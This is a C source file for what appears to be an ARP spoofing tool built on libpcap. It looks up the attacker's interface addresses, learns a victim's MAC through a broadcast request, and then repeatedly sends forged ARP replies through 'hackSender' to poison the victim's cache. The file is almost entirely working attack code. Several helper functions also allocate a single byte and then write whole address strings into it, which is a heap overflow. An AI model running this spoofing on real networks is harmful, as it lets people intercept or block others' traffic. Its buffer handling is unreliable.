#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <net/if_dl.h>
#include <net/if_arp.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <ifaddrs.h>
#include <errno.h>
#include <arpa/inet.h>

#include "module.h"
#include "pcap.h"
#include "gmem.h"

#define IP_ADDR_LEN 4

char * printIPAddress(uint8_t * ip) {
    char * ret = (char *)malloc(sizeof(char));
    sprintf(ret, "%u.%u.%u.%u\n", ip[0], ip[1], ip[2], ip[3]);

    return ret;
}

char * printMacAddress(u_char * mac) {
    char * ret = (char *)malloc(sizeof(char));

    for(int i = 0; i < ETHER_ADDR_LEN ; i++) {
        sprintf(ret + 3 * i, "%02x", mac[i]);
        if(i != ETHER_ADDR_LEN - 1) sprintf(ret + 3 * i + 2, ":");
    }
    sprintf(ret + 3 * ETHER_ADDR_LEN -1 , "\n\n");
    return ret;
}

bool cmpMacAddress(u_char * a, u_char * b) {
    for(int i = 0; i < ETHER_ADDR_LEN; i++) {
        if(a[i] != b[i]) return false;
    }
    return true;
}

uint8_t * parseIP(char * ori_ip) { // parsing string(ip)
    uint8_t * ip = (uint8_t *)malloc(sizeof(uint8_t) * IP_ADDR_LEN);
    char * token = strtok(ori_ip, ".");

    for(int i = 0; token != NULL; i++) {
        ip[i] = atoi(token);
        token = strtok(NULL, ".");
    }

    return ip;
}

u_char * makeArpPacket(u_char * src_mac, u_char * des_mac, uint8_t * src_ip, uint8_t * des_ip, int opcode = 1) {
    struct ether_header * ether_hdr = (struct ether_header *)malloc(sizeof(struct ether_header));

    memcpy(ether_hdr -> ether_shost, src_mac, ETHER_ADDR_LEN);
    memcpy(ether_hdr -> ether_dhost, des_mac, ETHER_ADDR_LEN);
    ether_hdr -> ether_type = htons(ETHERTYPE_ARP);
    
    struct ether_arp * req = (struct ether_arp *)malloc(sizeof(struct ether_arp));
    
    req -> ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    req -> ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    req -> ea_hdr.ar_hln = ETHER_ADDR_LEN;
    req -> ea_hdr.ar_pln = 4;
    req -> ea_hdr.ar_op = htons(opcode);

    if(opcode == 1) {
        for(int i = 0; i < ETHER_ADDR_LEN; i++) {
            des_mac[i] = 0;
        }
    }

    memcpy(req -> arp_sha, src_mac, ETHER_ADDR_LEN);
    memcpy(req -> arp_spa, src_ip, IP_ADDR_LEN);
    memcpy(req -> arp_tha, des_mac, ETHER_ADDR_LEN);
    memcpy(req -> arp_tpa, des_ip, IP_ADDR_LEN);

    u_char * packet = (u_char *)malloc(sizeof(struct ether_header) + sizeof(struct ether_arp));
    memcpy(packet, ether_hdr, sizeof(struct ether_header));
    memcpy(packet + sizeof(struct ether_header), req, sizeof(struct ether_arp));

    // printf("Packet : ");
    // for(int i = 0; i < sizeof(struct ether_header) + sizeof(struct ether_arp); i++) {
    //     printf("%02x ", packet[i]);
    // }
    // printf("\n\n");

    return packet;
}

char * getAttackerIPAddress(char * dev) {
    char * ip = (char *)malloc(sizeof(char));
    int fd;
    struct ifreq ifr;
    
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    snprintf(ifr.ifr_name, IFNAMSIZ, "%s", dev);
    ioctl(fd, SIOCGIFADDR, &ifr);
    ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);

    close(fd);

    return ip;
}

u_char * getAttackerMacAddress(char * dev) {
    struct ifaddrs *if_addrs = NULL;
    struct ifaddrs *if_addr = NULL;

    if (0 == getifaddrs(&if_addrs)) {    
        for (if_addr = if_addrs; if_addr != NULL; if_addr = if_addr->ifa_next) {
            if(!strcmp(dev, if_addr->ifa_name)) {
                printf("name : %s\n", if_addr->ifa_name);

                // MAC address
                if (if_addr->ifa_addr != NULL && if_addr->ifa_addr->sa_family == AF_LINK) {
                    struct sockaddr_dl* sdl = (struct sockaddr_dl *)if_addr->ifa_addr;
                    u_char * mac = (u_char *)malloc(sizeof(u_char) * ETHER_ADDR_LEN);
                    if (ETHER_ADDR_LEN == sdl->sdl_alen) {
                        memcpy(mac, LLADDR(sdl), sdl->sdl_alen);
                        printf("mac  : %02x:%02x:%02x:%02x:%02x:%02x\n\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
                        freeifaddrs(if_addrs);
                        if_addrs = NULL;
                        return mac;
                    }
                }
            }
        }
    } 
    else {
        printf("getifaddrs() failed with errno =  %i %s\n", errno, strerror(errno));
        exit(1);
    }
    return NULL;
}

u_char * getSenderMacAddress(pcap_t* handle, u_char * src_mac, uint8_t * src_ip, uint8_t * des_ip) {
    uint8_t broadcast[ETHER_ADDR_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    u_char * packet = makeArpPacket(src_mac, broadcast, src_ip, des_ip);
    pcap_sendpacket(handle, packet, sizeof(struct ether_header) + sizeof(struct ether_arp));

    int cnt = 0;
    while (++cnt) {
        struct pcap_pkthdr * header;
        const u_char * packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        struct ether_arp * res_pcap = DataLinkLayer(packet);
        if(res_pcap && ntohs(res_pcap -> ea_hdr.ar_op) == 2) return res_pcap -> arp_sha;
    }
    return NULL;
}


void hackSender(pcap_t * handle, u_char * src_mac, u_char * des_mac, uint8_t * src_ip, uint8_t * des_ip) {
    u_char * packet = makeArpPacket(src_mac, des_mac, src_ip, des_ip, 2);
    pcap_sendpacket(handle, packet, sizeof(struct ether_header) + sizeof(struct ether_arp));

    printf("[+] Blocked!\n");
}

void passTest(pcap_t * handle, u_char * src_mac, u_char * des_mac, uint8_t * src_ip, uint8_t * des_ip) {
    int cnt = 0;
    u_char sender_mac[6];
    for(int i = 0; i < ETHER_ADDR_LEN; i++) {
        sender_mac[i] = des_mac[i];
    }

    while (cnt < 3) {
        struct pcap_pkthdr * header;
        const u_char * packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        struct ether_arp * res_pcap = DataLinkLayer(packet);
        
        if(res_pcap) {
            if(cmpMacAddress(res_pcap -> arp_sha, sender_mac) && cmpMacAddress(res_pcap -> arp_tha, src_mac)) {
            cnt++;
            hackSender(handle, src_mac, sender_mac, src_ip, des_ip);
            }
        }
    }
}